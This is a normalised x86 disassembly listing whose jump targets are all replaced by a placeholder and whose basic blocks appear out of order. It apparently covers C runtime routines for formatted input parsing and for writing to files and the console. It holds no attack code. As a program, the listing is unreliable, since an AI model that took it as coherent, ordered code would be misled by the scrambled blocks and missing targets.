cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408312
movzx ecx [ edi ]
inc edi
mov [ ebp - 0x1bc ] edi
cmp ecx eax
jne r-xdata
cmp [ edi + 0x1 ] al
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0x19c ]
inc [ ebp - 0x1b8 ]
imul eax eax 0xa
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x19c ] eax
jmp r-xdata
mov al [ edi ]
test al al
jne r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
push [ ebp - 0x1b0 ]
call sub_404538
pop ecx
cmp [ edi ] 0x25
jne r-xdata
cmp eax 0xffffffff
je r-xdata
dec [ ebp - 0x18c ]
inc edi
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0x18d ] 0x0
je r-xdata
movzx eax al
push eax
call sub_40d8d6
pop ecx
test eax eax
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x1cc ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x1bc ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
push [ ebp - 0x1a4 ]
push eax
call sub_40d904
pop ecx
pop ecx
dec [ ebp - 0x185 ]
dec [ ebp - 0x195 ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
inc edi
movzx ebx [ edi ]
movzx eax bl
push eax
call sub_40d7d1
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x19d ] 0x0
mov [ ebp - 0x1bc ] edi
jne r-xdata
cmp [ ebp - 0x1f0 ] 0x0
je r-xdata
cmp [ ebp - 0x1a5 ] al
jne r-xdata
mov edi eax
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x6c
je r-xdata
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x19d ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
xor esi esi
mov eax [ ebp - 0x1e8 ]
mov esi [ eax ]
mov [ ebp - 0x200 ] eax
add eax 0x4
mov [ ebp - 0x1e8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x1f4 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
inc [ ebp - 0x1d8 ]
mov edi eax
mov [ ebp - 0x1c8 ] esi
mov [ ebp - 0x1c4 ] esi
jmp r-xdata
inc [ ebp - 0x185 ]
inc [ ebp - 0x195 ]
jmp r-xdata
inc [ ebp - 0x18d ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
movzx ebx [ edi ]
or ebx 0x20
mov [ ebp - 0x1b4 ] ebx
cmp ebx 0x6e
je r-xdata
mov al [ edi ]
cmp al 0x53
je r-xdata
cmp [ ebp - 0x195 ] 0x0
mov [ ebp - 0x1c0 ] esi
mov [ ebp - 0x18d ] 0x0
jne r-xdata
mov cl [ edi + 0x1 ]
cmp cl 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x1b8 ]
test ecx ecx
je r-xdata
cmp ebx 0x63
je r-xdata
mov [ ebp - 0x195 ] 0x1
mov [ ebp - 0x195 ] 0xff
cmp al 0x43
jne r-xdata
cmp cl 0x33
jne r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x185 ]
jmp r-xdata
cmp ebx 0x6f
jg r-xdata
cmp [ ebp - 0x19c ] 0x0
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408312
cmp ebx 0x7b
je r-xdata
cmp cl 0x64
je r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x32
jne r-xdata
mov eax ebx
sub eax 0x70
je r-xdata
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jmp r-xdata
mov esi [ ebp - 0x1c0 ]
mov edi [ ebp - 0x1bc ]
push [ ebp - 0x1a4 ]
lea esi [ ebp - 0x18c ]
call sub_408328
pop ecx
jmp r-xdata
cmp cl 0x69
je r-xdata
mov edi eax
jmp r-xdata
mov [ ebp - 0x185 ] 0x1
sub eax 0x3
je r-xdata
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
cmp ebx 0x63
je r-xdata
je r-xdata
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
cmp cl 0x6f
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a7 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
push 0x64
pop eax
cmp ebx eax
je r-xdata
cmp cl 0x78
je r-xdata
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
mov edi esi
je r-xdata
mov [ ebp - 0x1a6 ] 0x1
sub eax 0x3
je r-xdata
inc [ ebp - 0x19c ]
mov [ ebp - 0x1b8 ] 0x1
jle r-xdata
cmp cl 0x58
jne r-xdata
cmp [ ebp - 0x18d ] 0x0
mov edi [ ebp - 0x1e4 ]
jne r-xdata
cmp [ ebp - 0x18d ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408312
mov ebx eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1b8 ] 0x0
je r-xdata
push [ ebp - 0x1a4 ]
push [ ebp - 0x194 ]
call sub_40d904
pop ecx
pop ecx
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
movzx eax [ edi ]
cmp eax [ ebp - 0x194 ]
jne r-xdata
cmp ebx 0x67
jle r-xdata
jmp r-xdata
cmp [ ebp - 0x1a7 ] 0x0
je r-xdata
cmp [ ebp - 0x1b4 ] 0x78
je r-xdata
cmp [ ebp - 0x1a7 ] 0x0
mov edi [ ebp - 0x1e4 ]
je r-xdata
cmp [ ebp - 0x1b4 ] 0x78
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408312
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a7 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
dec [ ebp - 0x1a5 ]
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x194 ] 0x2d
jne r-xdata
cmp ebx 0x69
je r-xdata
cmp [ ebp - 0x1b4 ] 0x46
jne r-xdata
neg edi
movzx eax bl
push eax
call sub_40d855
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x1b4 ] 0x70
je r-xdata
mov eax [ ebp - 0x1c8 ]
mov ecx [ ebp - 0x1c4 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x1c8 ] eax
mov [ ebp - 0x1c4 ] ecx
jmp r-xdata
movzx eax bl
push eax
call sub_40d855
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x1b4 ] 0x70
je r-xdata
dec [ ebp - 0x18c ]
cmp eax 0xffffffff
je r-xdata
cmp ebx 0x63
je r-xdata
cmp edi esi
je r-xdata
cmp ebx 0x30
jne r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
cmp [ edi + 0x1 ] 0x5e
lea esi [ edi + 0x1 ]
jne r-xdata
mov [ ebp - 0x1a6 ] 0x1
mov edi [ ebp - 0x1bc ]
inc [ ebp - 0x1a5 ]
inc edi
mov [ ebp - 0x1bc ] edi
jmp r-xdata
mov eax [ ebp - 0x200 ]
mov [ ebp - 0x1e8 ] eax
jmp r-xdata
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1b0 ]
mov [ eax ] 0x2d
inc ebx
jmp r-xdata
mov [ ebp - 0x1b4 ] eax
cmp ebx 0x6e
jne r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
and [ ebp - 0x1ac ] 0x0
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
push ebx
shl edi 0x4
call sub_4082f2
mov ebx eax
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_40d7d1
pop ecx
test eax eax
je r-xdata
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
mov esi [ ebp - 0x1c8 ]
mov edi [ ebp - 0x1c4 ]
shld edi esi 0x4
push ebx
shl esi 0x4
call sub_4082f2
mov ebx eax
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_40d7d1
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x1a4 ]
push eax
call sub_40d904
pop ecx
pop ecx
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
cmp ebx 0x73
jne r-xdata
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408312
mov ebx eax
mov [ ebp - 0x194 ] ebx
cmp bl 0x78
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408312
mov ebx eax
mov [ ebp - 0x194 ] ebx
test ecx ecx
je r-xdata
push 0x20
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_40aef0
add esp 0xc
cmp [ esi ] 0x5d
jne r-xdata
lea esi [ edi + 0x2 ]
mov [ ebp - 0x1a8 ] 0xff
cmp [ ebp - 0x1b8 ] 0x0
jne r-xdata
dec [ ebp - 0x19c ]
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408312
mov [ ebp - 0x194 ] eax
cmp [ ebp - 0x19d ] 0x0
mov edi [ ebp - 0x18c ]
je r-xdata
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
push [ ebp - 0x1a4 ]
push ebx
call sub_40d904
pop ecx
pop ecx
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408312
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp [ ebp - 0x1b4 ] 0x6f
jne r-xdata
push [ ebp - 0x1a4 ]
push ebx
call sub_40d904
pop ecx
pop ecx
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408312
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp [ ebp - 0x1b4 ] 0x6f
jne r-xdata
inc edi
jmp r-xdata
cmp [ ebp - 0x1a6 ] 0x0
je r-xdata
cmp ebx 0x7b
jne r-xdata
cmp eax 0x9
jl r-xdata
inc [ ebp - 0x1cc ]
cmp ebx 0x63
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408312
cmp [ ebp - 0x1b8 ] 0x0
mov ebx eax
mov [ ebp - 0x194 ] ebx
je r-xdata
cmp bl 0x58
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
mov dl [ ebp - 0x1d1 ]
jmp r-xdata
mov dl 0x5d
inc esi
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
or [ ebp - 0x19c ] 0xffffffff
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x1cc ]
mov esi [ ebp - 0x1c0 ]
imul edi edi 0xa
jmp r-xdata
cmp ebx 0x38
jge r-xdata
push 0x0
push 0xa
push [ ebp - 0x1c4 ]
push [ ebp - 0x1c8 ]
call sub_40db20
mov esi eax
mov edi edx
jmp r-xdata
cmp ebx 0x38
jge r-xdata
mov [ esi ] al
inc esi
mov [ ebp - 0x1e0 ] al
movzx eax al
push eax
call sub_40cd35
pop ecx
test eax eax
je r-xdata
movsx ebx [ ebp - 0x1a8 ]
xor edx edx
mov ecx eax
and ecx 0x7
inc edx
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x24 ]
xor ecx ebx
mov ebx [ ebp - 0x1b4 ]
test ecx edx
je r-xdata
cmp eax 0x20
jne r-xdata
cmp eax 0xd
jle r-xdata
cmp [ ebp - 0x1a6 ] 0x0
je r-xdata
mov [ ebp - 0x1b4 ] 0x78
jmp r-xdata
sub [ ebp - 0x19c ] 0x2
cmp [ ebp - 0x19c ] 0x1
jge r-xdata
cmp [ ebp - 0x1b4 ] 0x78
mov [ ebp - 0x1ac ] 0x1
je r-xdata
mov al [ esi ]
cmp al 0x5d
jne r-xdata
push eax
call sub_40d7d1
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x185 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c8 ]
mov [ esi ] eax
mov eax [ ebp - 0x1c4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
inc [ ebp - 0x1ac ]
cmp [ ebp - 0x1b8 ] 0x0
lea edi [ edi + ebx - 0x30 ]
je r-xdata
shl edi 0x3
jmp r-xdata
inc [ ebp - 0x1ac ]
lea eax [ ebx - 0x30 ]
cdq
add esi eax
adc edi edx
cmp [ ebp - 0x1b8 ] 0x0
mov [ ebp - 0x1c8 ] esi
mov [ ebp - 0x1c4 ] edi
je r-xdata
mov esi [ ebp - 0x1c8 ]
mov edi [ ebp - 0x1c4 ]
shld edi esi 0x3
shl esi 0x3
jmp r-xdata
lea eax [ ebp - 0x1fc ]
push eax
mov eax [ ebp - 0x1fc ]
mov [ ebp - 0x1ec ] 0x3f
push [ eax + 0xac ]
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x1ec ]
push eax
call sub_40d9e7
mov ax [ ebp - 0x1ec ]
add esp 0x10
mov [ esi ] ax
add esi 0x2
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408312
mov [ ebp - 0x1df ] al
mov eax [ ebp - 0x1c0 ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1c0 ]
xor eax eax
mov [ ecx ] ax
jmp r-xdata
inc [ ebp - 0x18d ]
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
cmp [ ebp - 0x1b8 ] 0x0
je r-xdata
inc esi
cmp al 0x2d
jne r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1fc ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ ebp - 0x1a8 ] al
cmp al [ ebp - 0x194 ]
jne r-xdata
mov [ esi ] di
mov [ esi ] edi
jmp r-xdata
mov [ ebp - 0x1c0 ] esi
jmp r-xdata
push 0x30
pop ebx
jmp r-xdata
push [ ebp - 0x1a4 ]
push ebx
call sub_40d904
pop ecx
pop ecx
mov [ ebp - 0x1b4 ] 0x6f
jmp r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
mov ebx [ ebp - 0x1b4 ]
test dl dl
je r-xdata
mov [ ebp - 0x1bc ] esi
mov esi [ ebp - 0x1c0 ]
jmp r-xdata
mov al [ ebp - 0x194 ]
mov ecx [ ebp - 0x1b0 ]
inc [ ebp - 0x1ac ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_40829b
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov [ ebp - 0x194 ] ebx
inc [ ebp - 0x18d ]
mov cl [ esi ]
cmp cl 0x5d
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408312
mov [ ebp - 0x194 ] eax
movzx eax al
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x194 ] 0x65
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408312
mov ecx [ ebp - 0x1b0 ]
mov [ ebp - 0x194 ] eax
mov al [ ebp - 0x1a8 ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_40829b
add esp 0xc
test eax eax
je r-xdata
inc esi
cmp dl cl
jae r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
push [ ebp - 0x1a4 ]
push [ ebp - 0x194 ]
call sub_40d904
pop ecx
pop ecx
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp [ ebp - 0x194 ] 0x45
jne r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov [ ebp - 0x185 ] dl
mov dl cl
mov [ ebp - 0x185 ] cl
jmp r-xdata
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
mov eax [ ebp - 0x1b0 ]
mov [ ebx + eax ] 0x65
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_40829b
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_40d7d1
pop ecx
test eax eax
jne r-xdata
movzx ecx [ ebp - 0x185 ]
mov eax ecx
and ecx 0x7
mov dl 0x1
shl dl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] dl
xor dl dl
jmp r-xdata
mov al [ ebp - 0x185 ]
sub al dl
movzx edi dl
movzx edx al
cmp dl [ ebp - 0x185 ]
jae r-xdata
mov eax [ ebp - 0x1b0 ]
inc [ ebp - 0x1cc ]
lea ecx [ ebp - 0x1fc ]
push ecx
push eax
push [ ebp - 0x1c0 ]
mov [ ebx + eax ] 0x0
movsx eax [ ebp - 0x185 ]
dec eax
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
add esp 0x10
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408312
mov [ ebp - 0x194 ] eax
cmp eax 0x2d
jne r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov ecx edi
and ecx 0x7
mov eax edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc edi
dec edx
jne r-xdata
mov ebx [ ebp - 0x1b4 ]
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1b0 ]
mov [ ebx + eax ] 0x2d
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
call sub_40829b
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x1b0 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_40829b
add esp 0xc
test eax eax
je r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408312
mov [ ebp - 0x194 ] eax
movzx eax al
push eax
call sub_40d7d1
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408312
mov [ ebp - 0x194 ] eax
and [ ebp - 0x19c ] eax
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1b0 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_40829b
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408312
mov [ ebp - 0x194 ] eax
movzx eax al
sub_409356
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_40dba0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_405d52
mov [ eax ] edi
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4042ed
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_405d52
and [ eax ] 0x0
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
jmp r-xdata
push esi
call sub_40cb1f
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_40c967
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_407dbd
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_405d3f
mov [ eax ] 0x1c
call sub_405d52
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_405d65
pop ecx
jmp r-xdata
call sub_405d3f
mov [ eax ] 0x9
call sub_405d52
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_40cd35
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_40db54
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
